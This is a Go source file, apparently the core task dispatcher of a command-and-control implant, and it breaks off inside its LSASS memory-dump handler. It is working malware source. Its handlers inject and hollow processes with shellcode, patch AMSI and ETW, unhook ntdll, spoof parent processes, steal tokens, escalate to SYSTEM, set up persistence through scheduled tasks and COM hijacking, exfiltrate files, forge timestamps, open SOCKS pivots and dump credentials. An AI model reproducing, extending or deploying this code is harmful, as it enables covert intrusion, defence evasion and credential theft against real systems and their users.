package agent

import (
	"bufio"
	"bytes"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"os"
	"os/exec"
	"path/filepath"
	"regexp"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"time"
)

type sysInfo struct {
	Hostname    string
	Username    string
	OS          string
	PID         int
	ProcessName string
	IsAdmin     bool
}

type fsTaskArgs struct {
	Src       string `json:"src"`
	Dst       string `json:"dst"`
	Pattern   string `json:"pattern"`
	Path      string `json:"path"`
	Recursive bool   `json:"recursive"`
	Mode      string `json:"mode"`
	Owner     string `json:"owner"`
	Group     string `json:"group"`
	MTime     string `json:"mtime"`
	ATime     string `json:"atime"`
}

func parseFSTaskArgs(raw string) (fsTaskArgs, error) {
	var a fsTaskArgs
	if err := json.Unmarshal([]byte(raw), &a); err == nil {
		return a, nil
	}
	parts := strings.Fields(raw)
	if len(parts) >= 2 {
		a.Src, a.Dst = parts[0], strings.Join(parts[1:], " ")
	}
	return a, fmt.Errorf("expected JSON filesystem arguments")
}

func copyPath(src, dst string) error {
	info, err := os.Stat(src)
	if err != nil {
		return err
	}
	if d, err := os.Stat(dst); err == nil && d.IsDir() {
		dst = filepath.Join(dst, filepath.Base(filepath.Clean(src)))
	}
	if !info.IsDir() {
		if err := os.MkdirAll(filepath.Dir(dst), 0755); err != nil {
			return err
		}
		in, err := os.Open(src)
		if err != nil {
			return err
		}
		defer in.Close()
		out, err := os.OpenFile(dst, os.O_CREATE|os.O_TRUNC|os.O_WRONLY, info.Mode().Perm())
		if err != nil {
			return err
		}
		_, cpErr := io.Copy(out, in)
		closeErr := out.Close()
		if cpErr != nil {
			return cpErr
		}
		return closeErr
	}
	return filepath.Walk(src, func(path string, fi os.FileInfo, walkErr error) error {
		if walkErr != nil {
			return walkErr
		}
		rel, err := filepath.Rel(src, path)
		if err != nil {
			return err
		}
		target := filepath.Join(dst, rel)
		if fi.IsDir() {
			return os.MkdirAll(target, fi.Mode().Perm())
		}
		return copyPath(path, target)
	})
}

func shellQuoteUnix(s string) string { return "'" + strings.ReplaceAll(s, "'", "'\\''") + "'" }

func grepPath(pattern, root string, recursive bool) (string, error) {
	rx, err := regexp.Compile(pattern)
	if err != nil {
		return "", err
	}
	if root == "" {
		root = "."
	}
	var out strings.Builder
	matchFile := func(path string) error {
		data, err := os.ReadFile(path)
		if err != nil {
			return nil
		}
		for n, line := range strings.Split(string(data), "\n") {
			if rx.MatchString(line) {
				fmt.Fprintf(&out, "%s:%d:%s\n", path, n+1, line)
			}
			if out.Len() > 1024*1024 {
				return filepath.SkipAll
			}
		}
		return nil
	}
	info, err := os.Stat(root)
	if err != nil {
		return "", err
	}
	if !info.IsDir() {
		return out.String(), matchFile(root)
	}
	if !recursive {
		entries, e := os.ReadDir(root)
		if e != nil {
			return "", e
		}
		for _, ent := range entries {
			if !ent.IsDir() {
				_ = matchFile(filepath.Join(root, ent.Name()))
			}
		}
		return out.String(), nil
	}
	err = filepath.Walk(root, func(path string, fi os.FileInfo, walkErr error) error {
		if walkErr != nil {
			return nil
		}
		if !fi.IsDir() {
			return matchFile(path)
		}
		return nil
	})
	return out.String(), err
}

func getSysInfo() sysInfo {
	hostname, _ := os.Hostname()
	username := os.Getenv("USERNAME")
	if username == "" {
		username = os.Getenv("USER")
	}
	// Prefix with domain for domain accounts (USERDOMAIN != COMPUTERNAME on Windows)
	if domain := os.Getenv("USERDOMAIN"); domain != "" && !strings.EqualFold(domain, os.Getenv("COMPUTERNAME")) {
		username = domain + "\\" + username
	}
	procName := BuildName
	if procName == "" {
		if exe, err := os.Executable(); err == nil {
			procName = filepath.Base(exe)
		} else if len(os.Args) > 0 {
			procName = filepath.Base(os.Args[0])
		}
	}
	return sysInfo{
		Hostname:    hostname,
		Username:    username,
		OS:          runtime.GOOS + "/" + runtime.GOARCH,
		PID:         os.Getpid(),
		ProcessName: procName,
		IsAdmin:     isElevated(),
	}
}

type transport interface {
	register(sysInfo) error
	beacon() ([]taskWire, error)
	sendResult(taskID int64, output, errStr string) error
	sendResultAdmin(taskID int64, output, errStr string, isAdmin bool) error
	uploadFile(taskID int64, filename string, data []byte) error
	downloadFile(filename string) ([]byte, error)
}

// rawForwarder is implemented by transports that support N-hop pivoting.
// The SMB transport implements this by sending RELAY frames to the parent pivot.
type rawForwarder interface {
	rawForward(method, path string, body []byte) (int, []byte, error)
}

func dispatchTask(t transport, task taskWire) {
	// Tasks can originate from reactions/integrations as well as the GUI;
	// normalize the wire type so "shell" and "SHELL" behave identically.
	task.Type = strings.ToUpper(strings.TrimSpace(task.Type))
	switch task.Type {
	case "SHELL":
		output, err := runShell(task.Args)
		errStr := ""
		if err != nil {
			errStr = err.Error()
		}
		t.sendResult(task.ID, output, errStr)

	case "SHELL_OPSEC":
		t.sendResult(task.ID, runShellOpsec(task.Args), "")

	case "SLEEP":
		var args struct {
			Sec    int `json:"sec"`
			Jitter int `json:"jitter"`
		}
		if err := json.Unmarshal([]byte(task.Args), &args); err == nil {
			updateSleep(args.Sec, args.Jitter)
		}
		t.sendResult(task.ID, "sleep updated", "")

	case "CONFIG":
		var cfg struct {
			SleepSec     int    `json:"sleep_sec"`
			JitterPct    int    `json:"jitter_pct"`
			WorkingHours string `json:"working_hours"`
			KillDate     string `json:"kill_date"`
			InjectMethod string `json:"inject_method"`
			SpawnTo      string `json:"spawnto"`
			PPIDSpoof    string `json:"ppid"`
			SleepMask    string `json:"sleep_mask"`
		}
		if err := json.Unmarshal([]byte(task.Args), &cfg); err != nil {
			t.sendResult(task.ID, "", "config: "+err.Error())
			break
		}
		updated := []string{}
		if cfg.SleepSec > 0 {
			updateSleep(cfg.SleepSec, cfg.JitterPct)
			updated = append(updated, fmt.Sprintf("sleep=%ds±%d%%", cfg.SleepSec, cfg.JitterPct))
		}
		if cfg.WorkingHours != "" {
			WorkingHours = cfg.WorkingHours
			updated = append(updated, "working_hours="+cfg.WorkingHours)
		}
		if cfg.KillDate != "" {
			KillDate = cfg.KillDate
			updated = append(updated, "kill_date="+cfg.KillDate)
		}
		if cfg.InjectMethod != "" {
			InjectMethod = cfg.InjectMethod
			updated = append(updated, "inject_method="+cfg.InjectMethod)
		}
		if cfg.SpawnTo != "" {
			SacrificialProc = cfg.SpawnTo
			updated = append(updated, "spawnto="+cfg.SpawnTo)
		}
		if cfg.PPIDSpoof != "" {
			PPIDSpoof = cfg.PPIDSpoof
			updated = append(updated, "ppid="+cfg.PPIDSpoof)
		}
		if cfg.SleepMask != "" {
			SleepMaskMode = cfg.SleepMask
			updated = append(updated, "sleep_mask="+cfg.SleepMask)
		}
		msg := "[+] config updated"
		if len(updated) > 0 {
			msg += ": " + strings.Join(updated, ", ")
		}
		t.sendResult(task.ID, msg, "")

	case "SYSINFO":
		info := getSysInfo()
		out := fmt.Sprintf("hostname=%s user=%s os=%s pid=%d",
			info.Hostname, info.Username, info.OS, info.PID)
		t.sendResult(task.ID, out, "")

	case "DOWNLOAD":
		var args struct {
			Path string `json:"path"`
		}
		// Accept both the current plain-path wire format and the legacy JSON
		// envelope so older operators remain compatible.
		if err := json.Unmarshal([]byte(task.Args), &args); err != nil || args.Path == "" {
			args.Path = strings.TrimSpace(task.Args)
		}
		if args.Path == "" {
			t.sendResult(task.ID, "", "download: path required")
			return
		}
		data, err := os.ReadFile(args.Path)
		if err != nil {
			t.sendResult(task.ID, "", err.Error())
			return
		}
		filename := filepath.Base(args.Path)
		if err := t.uploadFile(task.ID, filename, data); err != nil {
			t.sendResult(task.ID, "", err.Error())
			return
		}
		t.sendResult(task.ID, fmt.Sprintf("uploaded %s (%d bytes)", filename, len(data)), "")

	case "UPLOAD":
		var args struct {
			Filename   string `json:"filename"`
			RemotePath string `json:"remote_path"`
		}
		if err := json.Unmarshal([]byte(task.Args), &args); err != nil {
			t.sendResult(task.ID, "", "bad args: "+err.Error())
			return
		}
		data, err := t.downloadFile(args.Filename)
		if err != nil {
			t.sendResult(task.ID, "", err.Error())
			return
		}
		dest := args.RemotePath
		base := filepath.Base(args.Filename)
		if dest == "." || strings.HasSuffix(dest, string(os.PathSeparator)) || strings.HasSuffix(dest, "/") {
			dest = filepath.Join(dest, base)
		}
		if err := os.WriteFile(dest, data, 0644); err != nil {
			t.sendResult(task.ID, "", err.Error())
			return
		}
		t.sendResult(task.ID, fmt.Sprintf("written %d bytes to %s", len(data), dest), "")

	case "STAGE2":
		if task.Payload == "" {
			t.sendResult(task.ID, "", "empty shellcode payload")
			return
		}
		sc, err := base64.StdEncoding.DecodeString(task.Payload)
		if err != nil {
			t.sendResult(task.ID, "", "decode shellcode: "+err.Error())
			return
		}
		t.sendResult(task.ID, fmt.Sprintf("injecting %d bytes", len(sc)), "")
		go func() { injectShellcode(sc) }()

	case "BOF":
		output, err := dispatchBOF(task)
		errStr := ""
		if err != nil {
			errStr = err.Error()
		}
		t.sendResult(task.ID, output, errStr)

	case "CLR_STOMP":
		t.sendResult(task.ID, clrStomp(), "")

	case "DOTNET_EXEC":
		// Args JSON: {"asm":"<base64>","args":"<string>","type":"<opt>","method":"<opt>"}
		var da struct {
			Asm        string `json:"asm"`
			Args       string `json:"args"`
			Type       string `json:"type"`
			Method     string `json:"method"`
			TimeoutSec int    `json:"timeout_sec"`
		}
		if err := json.Unmarshal([]byte(task.Args), &da); err != nil {
			t.sendResult(task.ID, "", "bad DOTNET_EXEC args: "+err.Error())
			return
		}
		if da.Asm == "" {
			t.sendResult(task.ID, "", "DOTNET_EXEC: asm field is empty")
			return
		}
		asmBytes, err := base64.StdEncoding.DecodeString(da.Asm)
		if err != nil {
			t.sendResult(task.ID, "", "DOTNET_EXEC: base64 decode asm: "+err.Error())
			return
		}
		output, err := forkRunAssembly(asmBytes, da.Args, da.TimeoutSec)
		errStr := ""
		if err != nil {
			errStr = err.Error()
		}
		t.sendResult(task.ID, output, errStr)

	case "BOF_LIST":
		t.sendResult(task.ID, "BOF execution supported. Upload a .coff/.o file with 'upload', then run with 'bof <filename>'.\nSupported arg types: z (string), i (int32), s (int16), b (bool/byte), Z (wstring), B (binary blob).", "")

	case "HOOK_CHECK":
		t.sendResult(task.ID, checkHooks(), "")

	case "AMSI_BYPASS":
		patchAMSI()
		patchETW()
		disableETWProcess()
		t.sendResult(task.ID, "[+] AMSI/ETW re-patched", "")

	case "NTDLL_UNHOOK":
		unhookNtdll()
		t.sendResult(task.ID, "[+] ntdll.dll re-mapped from disk", "")

	case "HW_BP_CHECK":
		if hasHWBreakpoints() {
			t.sendResult(task.ID, "[!] Hardware breakpoints DETECTED on current thread (DR0-DR3 non-zero)", "")
		} else {
			t.sendResult(task.ID, "[+] No hardware breakpoints detected", "")
		}

	case "THREAD_HIJACK":
		// Args: "<pid>"  Payload: shellcode (base64)
		pid, err := strconv.Atoi(strings.TrimSpace(task.Args))
		if err != nil {
			t.sendResult(task.ID, "", "invalid pid: "+err.Error())
			return
		}
		sc, err := base64.StdEncoding.DecodeString(task.Payload)
		if err != nil {
			t.sendResult(task.ID, "", "decode shellcode: "+err.Error())
			return
		}
		out, err := injectRemoteHijack(pid, sc)
		errStr := ""
		if err != nil {
			errStr = err.Error()
		}
		t.sendResult(task.ID, out, errStr)

	case "MEM_FLUCTUATE":
		// Args: "start [interval_sec]" | "stop"
		parts := strings.Fields(task.Args)
		if len(parts) == 0 || parts[0] == "stop" {
			StopScramblerDaemon()
			t.sendResult(task.ID, "[+] memory scrambler stopped", "")
			return
		}
		intervalSec := 10
		if len(parts) >= 2 {
			if n, err := strconv.Atoi(parts[1]); err == nil && n > 0 {
				intervalSec = n
			}
		}
		StartScramblerDaemon(time.Duration(intervalSec) * time.Second)
		t.sendResult(task.ID, fmt.Sprintf("[+] memory scrambler started (interval %ds)", intervalSec), "")

	// ── Filesystem ────────────────────────────────────────────────────────────

	case "DRIVES":
		out, err := listDrivesJSON()
		errStr := ""
		if err != nil {
			errStr = err.Error()
		}
		t.sendResult(task.ID, out, errStr)

	case "NET_SHARES":
		host := strings.TrimLeft(strings.TrimSpace(task.Args), "\\/")
		out, err := netSharesJSON(host)
		errStr := ""
		if err != nil {
			errStr = err.Error()
		}
		t.sendResult(task.ID, out, errStr)

	case "PWD":
		wd, err := os.Getwd()
		if err != nil {
			t.sendResult(task.ID, "", err.Error())
			return
		}
		t.sendResult(task.ID, wd, "")

	case "CD":
		path := strings.TrimSpace(task.Args)
		if path == "" {
			home, _ := os.UserHomeDir()
			path = home
		}
		if err := os.Chdir(path); err != nil {
			t.sendResult(task.ID, "", err.Error())
			return
		}
		wd, _ := os.Getwd()
		t.sendResult(task.ID, wd, "")

	case "LS":
		path := strings.TrimSpace(task.Args)
		if path == "" {
			path = "."
		}
		entries, err := os.ReadDir(path)
		if err != nil {
			t.sendResult(task.ID, "", err.Error())
			return
		}
		var sb strings.Builder
		for _, e := range entries {
			info, _ := e.Info()
			if e.IsDir() {
				fmt.Fprintf(&sb, "d  %-12s  %s\n", "", e.Name())
			} else if info != nil {
				fmt.Fprintf(&sb, "f  %-12d  %s\n", info.Size(), e.Name())
			}
		}
		t.sendResult(task.ID, sb.String(), "")

	case "LS_JSON":
		path := strings.TrimSpace(task.Args)
		if path == "" {
			path = "."
		}
		absPath, _ := filepath.Abs(path)
		entries, err := os.ReadDir(absPath)
		if err != nil {
			data, _ := json.Marshal(map[string]string{"error": err.Error()})
			t.sendResult(task.ID, string(data), "")
			return
		}
		type fsEntry struct {
			Name  string `json:"name"`
			IsDir bool   `json:"is_dir"`
			Size  int64  `json:"size"`
			Mod   string `json:"mod"`
		}
		items := make([]fsEntry, 0, len(entries))
		for _, e := range entries {
			info, _ := e.Info()
			item := fsEntry{Name: e.Name(), IsDir: e.IsDir()}
			if info != nil {
				item.Size = info.Size()
				item.Mod = info.ModTime().UTC().Format("2006-01-02 15:04")
			}
			items = append(items, item)
		}
		wd, _ := os.Getwd()
		data, _ := json.Marshal(map[string]interface{}{
			"cwd":     wd,
			"path":    absPath,
			"entries": items,
		})
		t.sendResult(task.ID, string(data), "")

	case "PS_JSON":
		output, err := listProcessesJSON()
		errStr := ""
		if err != nil {
			errStr = err.Error()
		}
		t.sendResult(task.ID, output, errStr)

	case "MKDIR":
		path := strings.TrimSpace(task.Args)
		if err := os.MkdirAll(path, 0755); err != nil {
			t.sendResult(task.ID, "", err.Error())
			return
		}
		t.sendResult(task.ID, "created: "+path, "")

	case "RM":
		path := strings.TrimSpace(task.Args)
		if err := os.RemoveAll(path); err != nil {
			t.sendResult(task.ID, "", err.Error())
			return
		}
		t.sendResult(task.ID, "removed: "+path, "")

	case "ENV":
		var sb strings.Builder
		for _, e := range os.Environ() {
			sb.WriteString(e + "\n")
		}
		t.sendResult(task.ID, sb.String(), "")

	case "CAT":
		data, err := os.ReadFile(strings.TrimSpace(task.Args))
		if err != nil {
			t.sendResult(task.ID, "", err.Error())
			return
		}
		t.sendResult(task.ID, string(data), "")

	case "CP", "MV":
		a, _ := parseFSTaskArgs(task.Args)
		if a.Src == "" || a.Dst == "" {
			t.sendResult(task.ID, "", "usage: {src,dst}")
			return
		}
		var err error
		if task.Type == "CP" {
			err = copyPath(a.Src, a.Dst)
		} else {
			dst := a.Dst
			if info, e := os.Stat(dst); e == nil && info.IsDir() {
				dst = filepath.Join(dst, filepath.Base(filepath.Clean(a.Src)))
			}
			err = os.Rename(a.Src, dst)
			if err != nil {
				if cpErr := copyPath(a.Src, dst); cpErr == nil {
					err = os.RemoveAll(a.Src)
				}
			}
		}
		if err != nil {
			t.sendResult(task.ID, "", task.Type+": "+err.Error())
			return
		}
		t.sendResult(task.ID, fmt.Sprintf("[+] %s %s → %s", strings.ToLower(task.Type), a.Src, a.Dst), "")

	case "GREP":
		a, _ := parseFSTaskArgs(task.Args)
		if a.Pattern == "" || a.Path == "" {
			t.sendResult(task.ID, "", "usage: {pattern,path}")
			return
		}
		out, err := grepPath(a.Pattern, a.Path, a.Recursive)
		if err != nil {
			t.sendResult(task.ID, "", "grep: "+err.Error())
			return
		}
		t.sendResult(task.ID, out, "")

	case "MOUNT":
		arg := strings.TrimSpace(task.Args)
		if strings.HasPrefix(arg, "{") {
			var a fsTaskArgs
			_ = json.Unmarshal([]byte(arg), &a)
			arg = a.Path
		}
		cmd := "mount"
		if arg != "" {
			cmd += " " + shellQuoteUnix(arg)
		}
		out, err := runShell(cmd)
		errStr := ""
		if err != nil {
			errStr = err.Error()
		}
		t.sendResult(task.ID, out, errStr)

	case "CHMOD":
		a, _ := parseFSTaskArgs(task.Args)
		mode, err := strconv.ParseUint(strings.TrimPrefix(strings.TrimSpace(a.Mode), "0o"), 8, 32)
		if err != nil || a.Path == "" {
			t.sendResult(task.ID, "", "usage: {mode,path}")
			return
		}
		if err := os.Chmod(a.Path, os.FileMode(mode)); err != nil {
			t.sendResult(task.ID, "", "chmod: "+err.Error())
			return
		}
		t.sendResult(task.ID, fmt.Sprintf("[+] chmod %s %s", a.Mode, a.Path), "")

	case "CHOWN":
		a, _ := parseFSTaskArgs(task.Args)
		if runtime.GOOS == "windows" {
			t.sendResult(task.ID, "", "chown: not supported on Windows")
			return
		}
		if a.Owner == "" || a.Path == "" {
			t.sendResult(task.ID, "", "usage: {owner,group,path}")
			return
		}
		owner := a.Owner
		if a.Group != "" {
			owner += ":" + a.Group
		}
		out, err := runShell("chown " + shellQuoteUnix(owner) + " " + shellQuoteUnix(a.Path))
		errStr := ""
		if err != nil {
			errStr = err.Error()
		}
		t.sendResult(task.ID, out, errStr)

	case "CHTIMES":
		a, _ := parseFSTaskArgs(task.Args)
		if a.Path == "" || a.MTime == "" {
			t.sendResult(task.ID, "", "usage: {mtime,path}")
			return
		}
		mt, err := time.Parse(time.RFC3339, a.MTime)
		if err != nil {
			t.sendResult(task.ID, "", "chtimes: "+err.Error())
			return
		}
		at := mt
		if a.ATime != "" {
			at, err = time.Parse(time.RFC3339, a.ATime)
			if err != nil {
				t.sendResult(task.ID, "", "chtimes: "+err.Error())
				return
			}
		}
		if err := os.Chtimes(a.Path, at, mt); err != nil {
			t.sendResult(task.ID, "", "chtimes: "+err.Error())
			return
		}
		t.sendResult(task.ID, "[+] timestamps updated", "")

	// ── Process ───────────────────────────────────────────────────────────────

	case "GETPID":
		t.sendResult(task.ID, fmt.Sprintf("%d", os.Getpid()), "")

	case "PPID":
		var pa struct {
			Cmd    string `json:"cmd"`
			Parent string `json:"parent"`
		}
		if err := json.Unmarshal([]byte(task.Args), &pa); err != nil || pa.Cmd == "" {
			pa.Cmd = "cmd.exe"
		}
		if pa.Parent == "" {
			pa.Parent = "explorer.exe"
		}
		t.sendResult(task.ID, spawnWithPPID(pa.Cmd, pa.Parent), "")

	case "EVASION_STATUS":
		spoofGadget := getSpoofGadgetAddr()
		status := fmt.Sprintf(
			"SleepMaskMode : %s\nEvasionPatches: %s\nAMSIMethod    : %s\nPPIDSpoof     : %s\nSpoofGadget   : 0x%x\n",
			SleepMaskMode, EvasionPatches, AMSIMethod, PPIDSpoof, spoofGadget,
		)
		t.sendResult(task.ID, status, "")

	case "PS":
		output, err := listProcesses()
		errStr := ""
		if err != nil {
			errStr = err.Error()
		}
		t.sendResult(task.ID, output, errStr)

	// ── Cleanup ───────────────────────────────────────────────────────────────

	case "CLEANUP":
		t.sendResult(task.ID, "cleaning up...", "")
		go selfCleanup()

	// ── Pivot ─────────────────────────────────────────────────────────────────

	case "SOCKS_START":
		// Args: JSON {port,user,pass}; accept the legacy text form too.
		parts := strings.Fields(task.Args)
		port := 1080
		var socksU, socksP string
		var sa struct {
			Port int    `json:"port"`
			User string `json:"user"`
			Pass string `json:"pass"`
		}
		if json.Unmarshal([]byte(task.Args), &sa) == nil && sa.Port > 0 {
			port, socksU, socksP = sa.Port, sa.User, sa.Pass
		} else if len(parts) >= 1 {
			if p, err := strconv.Atoi(parts[0]); err == nil {
				port = p
			}
			if len(parts) >= 2 {
				if idx := strings.Index(parts[1], ":"); idx > 0 {
					socksU = parts[1][:idx]
					socksP = parts[1][idx+1:]
				}
			}
		}
		addr, err := startSOCKS5(port, socksU, socksP)
		if err != nil {
			t.sendResult(task.ID, "", "SOCKS5 start failed: "+err.Error())
			return
		}
		msg := "SOCKS5 listening on " + addr
		if socksU != "" {
			msg += " (auth: " + socksU + ")"
		}
		t.sendResult(task.ID, msg, "")

	case "SOCKS_STOP":
		stopSOCKS5()
		t.sendResult(task.ID, "SOCKS5 stopped", "")

	case "PORTFWD_ADD":
		// Args: "[proto] <lport> <rhost> <rport>"  proto defaults to "tcp"
		parts := strings.Fields(task.Args)
		proto := "tcp"
		if len(parts) == 4 && (parts[0] == "tcp" || parts[0] == "udp") {
			proto = parts[0]
			parts = parts[1:]
		}
		if len(parts) < 3 {
			t.sendResult(task.ID, "", "usage: [tcp|udp] <lport> <rhost> <rport>")
			return
		}
		lport, e1 := strconv.Atoi(parts[0])
		rport, e2 := strconv.Atoi(parts[2])
		if e1 != nil || e2 != nil {
			t.sendResult(task.ID, "", "invalid port numbers")
			return
		}
		if err := addPortFwdProto(proto, lport, parts[1], rport); err != nil {
			t.sendResult(task.ID, "", err.Error())
			return
		}
		t.sendResult(task.ID, fmt.Sprintf("%s forwarding :%d → %s:%d", proto, lport, parts[1], rport), "")

	case "PORTFWD_DEL":
		// Args: "[proto] <lport>"
		parts := strings.Fields(task.Args)
		proto := "tcp"
		portStr := ""
		if len(parts) == 2 && (parts[0] == "tcp" || parts[0] == "udp") {
			proto = parts[0]
			portStr = parts[1]
		} else if len(parts) == 1 {
			portStr = parts[0]
		}
		lport, err := strconv.Atoi(portStr)
		if err != nil {
			t.sendResult(task.ID, "", "invalid port")
			return
		}
		delPortFwdProto(proto, lport)
		t.sendResult(task.ID, fmt.Sprintf("%s port forward :%d removed", proto, lport), "")

	case "PORTFWD_LIST":
		t.sendResult(task.ID, listPortFwds(), "")

	// ── Windows-specific (stubs on other platforms) ────────────────────────────

	case "SCREENSHOT":
		output, err := takeScreenshot(t, task.ID)
		errStr := ""
		if err != nil {
			errStr = err.Error()
		}
		t.sendResult(task.ID, output, errStr)

	case "INJECT_REMOTE":
		// Args: "<pid>" Payload: shellcode (base64)
		pid, err := strconv.Atoi(strings.TrimSpace(task.Args))
		if err != nil {
			t.sendResult(task.ID, "", "invalid pid")
			return
		}
		sc, err := base64.StdEncoding.DecodeString(task.Payload)
		if err != nil {
			t.sendResult(task.ID, "", "decode: "+err.Error())
			return
		}
		if err := injectRemote(pid, sc); err != nil {
			t.sendResult(task.ID, "", err.Error())
			return
		}
		t.sendResult(task.ID, fmt.Sprintf("injected %d bytes into PID %d", len(sc), pid), "")

	case "TOKEN_STEAL", "STEAL_TOKEN":
		var pid int
		argStr := strings.TrimSpace(task.Args)
		if len(argStr) > 0 && argStr[0] == '{' {
			var j struct {
				Pid int `json:"pid"`
			}
			if err := json.Unmarshal([]byte(argStr), &j); err == nil {
				pid = j.Pid
			}
		} else {
			pid, _ = strconv.Atoi(argStr)
		}
		if pid == 0 {
			t.sendResult(task.ID, "", "TOKEN_STEAL requires pid > 0")
			return
		}
		out, err := stealToken(pid)
		errStr := ""
		if err != nil {
			errStr = err.Error()
		}
		t.sendResult(task.ID, out, errStr)

	case "TOKEN_MAKE":
		// Args: "<domain>\<user> <password>"
		parts := strings.SplitN(task.Args, " ", 2)
		if len(parts) < 2 {
			t.sendResult(task.ID, "", `usage: <domain\user> <password>`)
			return
		}
		out, err := makeToken(parts[0], parts[1])
		errStr := ""
		if err != nil {
			errStr = err.Error()
		}
		t.sendResult(task.ID, out, errStr)

	case "TOKEN_DROP", "REV2SELF":
		out, err := dropToken()
		errStr := ""
		if err != nil {
			errStr = err.Error()
		}
		t.sendResult(task.ID, out, errStr)

	case "TOKEN_WHOAMI":
		t.sendResult(task.ID, tokenWhoami(), "")

	case "GETSYSTEM":
		out, ok := GetSystem()
		if ok {
			t.sendResultAdmin(task.ID, out, "", true)
		} else {
			t.sendResult(task.ID, out, "")
		}

	case "PERSIST", "PERSIST_TASK", "PERSIST_RM":
		// PERSIST_TASK → schtask method; PERSIST_RM → remove; PERSIST → explicit method
		var pa struct {
			Method string `json:"method"`
			Cmd    string `json:"cmd"`
			Name   string `json:"name"`
		}
		switch task.Type {
		case "PERSIST_TASK":
			pa.Method = "schtask"
			pa.Name = strings.TrimSpace(task.Args)
			if exe, err := os.Executable(); err == nil {
				pa.Cmd = exe
			} else {
				pa.Cmd = os.Args[0]
			}
		case "PERSIST_RM":
			pa.Method = "rm"
			if err := json.Unmarshal([]byte(task.Args), &pa); err != nil {
				pa.Name = strings.TrimSpace(task.Args)
			}
		default:
			if err := json.Unmarshal([]byte(task.Args), &pa); err != nil {
				// fallback: space-separated
				f := strings.Fields(task.Args)
				if len(f) >= 2 {
					pa.Method = f[0]
					pa.Cmd = strings.Join(f[1:], " ")
				} else if len(f) == 1 {
					pa.Method = f[0]
				}
			}
			// Auto-fill cmd with own exe path when not specified (same as PERSIST_TASK)
			if pa.Cmd == "" && pa.Method != "rm" && pa.Method != "remove" && pa.Method != "comhijack-rm" && pa.Method != "com-rm" {
				if exe, err := os.Executable(); err == nil {
					pa.Cmd = exe
				} else {
					pa.Cmd = os.Args[0]
				}
			}
		}
		out, err := persistMethod(pa.Method, pa.Cmd, pa.Name)
		errStr := ""
		if err != nil {
			errStr = err.Error()
		}
		t.sendResult(task.ID, out, errStr)

	case "FORK_RUN":
		// Args JSON: {"cmd":"<sacrificial_process>"} (optional). Payload: shellcode.
		sc, err := base64.StdEncoding.DecodeString(task.Payload)
		if err != nil {
			t.sendResult(task.ID, "", "decode: "+err.Error())
			return
		}
		var fa struct {
			Cmd string `json:"cmd"`
		}
		_ = json.Unmarshal([]byte(task.Args), &fa)
		out, err := forkRun(sc, strings.TrimSpace(fa.Cmd))
		errStr := ""
		if err != nil {
			errStr = err.Error()
		}
		t.sendResult(task.ID, out, errStr)

	case "HOLLOW":
		// Args JSON: {"target":"<proc_path_optional>","payload":"<uploaded_filename_optional>"}
		// Shellcode bytes may arrive in task.Payload (base64) or be downloaded by name from args.payload.
		var ha struct {
			Target  string `json:"target"`
			Payload string `json:"payload"`
		}
		if err := json.Unmarshal([]byte(task.Args), &ha); err != nil {
			t.sendResult(task.ID, "", "bad HOLLOW args: "+err.Error())
			return
		}
		var sc []byte
		var err error
		if task.Payload != "" {
			sc, err = base64.StdEncoding.DecodeString(task.Payload)
			if err != nil {
				t.sendResult(task.ID, "", "hollow: decode payload: "+err.Error())
				return
			}
		} else {
			sc, err = t.downloadFile(ha.Payload)
			if err != nil {
				t.sendResult(task.ID, "", "hollow: download '"+ha.Payload+"': "+err.Error())
				return
			}
		}
		out, err := hollowProcess(ha.Target, sc)
		errStr := ""
		if err != nil {
			errStr = err.Error()
		}
		t.sendResult(task.ID, out, errStr)

	case "SHELLCODE_STOMP":
		// Args JSON (optional): {"dll":"<target_dll_name>"} — omit for auto-pick
		var sa struct {
			DLL string `json:"dll"`
		}
		json.Unmarshal([]byte(task.Args), &sa)
		if len(task.Payload) == 0 {
			t.sendResult(task.ID, "", "SHELLCODE_STOMP: no shellcode payload")
			return
		}
		scBytes, err := base64.StdEncoding.DecodeString(task.Payload)
		if err != nil {
			t.sendResult(task.ID, "", "SHELLCODE_STOMP: base64 decode: "+err.Error())
			return
		}
		t.sendResult(task.ID, shellcodeStomp(scBytes, sa.DLL), "")

	case "UDRL":
		// Args JSON: {"payload":"<uploaded_filename>","host_dll":"<optional override>"}
		var ua struct {
			Payload string `json:"payload"`
			HostDLL string `json:"host_dll"`
		}
		if err := json.Unmarshal([]byte(task.Args), &ua); err != nil {
			t.sendResult(task.ID, "", "bad UDRL args: "+err.Error())
			return
		}
		sc, err := t.downloadFile(ua.Payload)
		if err != nil {
			t.sendResult(task.ID, "", "udrl: download '"+ua.Payload+"': "+err.Error())
			return
		}
		out, err := phantomLoad(sc)
		errStr := ""
		if err != nil {
			errStr = err.Error()
		}
		t.sendResult(task.ID, out, errStr)

	case "BLOCKDLLS":
		// Args: "on" or "off"
		enable := strings.ToLower(strings.TrimSpace(task.Args)) != "off"
		out, err := blockDLLs(enable)
		errStr := ""
		if err != nil {
			errStr = err.Error()
		}
		t.sendResult(task.ID, out, errStr)

	case "GEN_LNK":
		// Args JSON: {"target":"...","args":"...","working_dir":"...","icon_path":"...","icon_index":0,"outfile":"..."}
		var opts GenLNKOptions
		if err := json.Unmarshal([]byte(task.Args), &opts); err != nil {
			t.sendResult(task.ID, "", "bad GEN_LNK args: "+err.Error())
			return
		}
		out, err := genLNK(opts)
		errStr := ""
		if err != nil {
			errStr = err.Error()
		}
		t.sendResult(task.ID, out, errStr)

	case "COM_HIJACK":
		// Args JSON: {"clsid":"...","dll":"...","name":"..."}  or "rm <clsid>"
		if strings.HasPrefix(strings.TrimSpace(task.Args), "rm ") {
			clsid := strings.TrimSpace(strings.TrimPrefix(task.Args, "rm "))
			out, err := comHijackRemove(clsid)
			errStr := ""
			if err != nil {
				errStr = err.Error()
			}
			t.sendResult(task.ID, out, errStr)
			return
		}
		var chArgs struct {
			CLSID string `json:"clsid"`
			DLL   string `json:"dll"`
			Name  string `json:"name"`
		}
		if err := json.Unmarshal([]byte(task.Args), &chArgs); err != nil {
			t.sendResult(task.ID, "", "bad COM_HIJACK args: "+err.Error())
			return
		}
		out, err := comHijack(chArgs.CLSID, chArgs.DLL, chArgs.Name)
		errStr := ""
		if err != nil {
			errStr = err.Error()
		}
		t.sendResult(task.ID, out, errStr)

	case "MINIDUMP":
		// Args: optional PID (0 = auto-find lsass.exe)
		var pid uint32
		if task.Args != "" {
			if p, err := strconv.ParseUint(strings.TrimSpace(task.Args), 10, 32); err == nil {
				pid = uint32(p)
			}
		}
		data, err := lsassDump(pid)
		if err != nil {
			t.sendResult(task.ID, "", err.Error())
			return
		}
